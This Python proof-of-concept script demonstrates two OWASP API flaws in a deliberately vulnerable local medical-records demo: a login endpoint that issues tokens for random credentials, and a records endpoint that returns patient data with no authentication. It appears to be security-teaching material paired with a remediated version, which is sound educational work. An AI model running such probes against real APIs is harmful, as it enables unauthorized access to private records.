"""
Attack script: Authentication bypass against vulnerable/app.py
For security education only — run only against localhost demo instances.

Demonstrates:
  - OWASP API2:2023  Broken Authentication  (POST /login)
  - OWASP API1:2023  Broken Object Level Authorization  (GET /records)
"""

import requests
import json
import random
import string

BASE_URL = "http://127.0.0.1:8000"


def random_credentials(length: int = 8) -> tuple[str, str]:
    """Generate random username and password that the attacker has never registered."""
    chars = string.ascii_lowercase + string.digits
    username = "attacker_" + "".join(random.choices(chars, k=length))
    password = "".join(random.choices(chars, k=length))
    return username, password


def demonstrate_auth_bypass() -> str | None:
    """
    Step 1 — Authentication bypass.

    The attacker submits completely random credentials.
    A secure API would reject them with HTTP 401.
    This vulnerable API accepts anything and issues a token.
    """
    username, password = random_credentials()
    print("=" * 60)
    print("STEP 1: Authentication Bypass (POST /login)")
    print("=" * 60)
    print(f"  Sending random credentials — username: {username!r}, password: {password!r}")

    response = requests.post(f"{BASE_URL}/login", json={"username": username, "password": password})

    print(f"  HTTP status : {response.status_code}")
    if response.status_code == 200:
        token = response.json().get("access_token")
        print(f"  [EXPLOIT] Server issued token for unregistered user: {token!r}")
        print("  Expected:   HTTP 401 Unauthorized")
        return token
    else:
        print("  Login failed (server behaved correctly).")
        return None


def demonstrate_unauthorized_access(token: str | None) -> None:
    """
    Step 2 — Unauthorized data access.

    The attacker calls GET /records with no Authorization header at all.
    A secure API would return HTTP 401 / 403.
    This vulnerable API returns all patient records to any anonymous request.
    """
    print()
    print("=" * 60)
    print("STEP 2: Unauthorized Data Access (GET /records)")
    print("=" * 60)

    # Intentionally send NO Authorization header to prove the endpoint
    # does not require authentication at all.
    print("  Sending request with NO Authorization header ...")
    response = requests.get(f"{BASE_URL}/records")

    print(f"  HTTP status : {response.status_code}")
    if response.status_code == 200:
        data = response.json()
        patients = data.get("patients", [])
        print(f"  [EXPLOIT] {len(patients)} patient record(s) exposed without authentication:")
        print()
        print(json.dumps(patients, indent=4))
        print()
        print("  Expected:   HTTP 401 Unauthorized")
    else:
        print("  Access denied (server behaved correctly).")


def main() -> None:
    print()
    print("  Medical Records API — Authentication Bypass PoC")
    print("  Target:", BASE_URL)
    print("  WARNING: Run only against the local demo instance.")
    print()

    token = demonstrate_auth_bypass()
    demonstrate_unauthorized_access(token)

    print("=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print("  Vulnerability 1  POST /login accepts any credentials")
    print("                   -> OWASP API2:2023 Broken Authentication")
    print("  Vulnerability 2  GET /records requires no token")
    print("                   -> OWASP API1:2023 Broken Object Level Authorization")
    print()
    print("  See secure/app.py for the remediated version.")
    print()


if __name__ == "__main__":
    main()
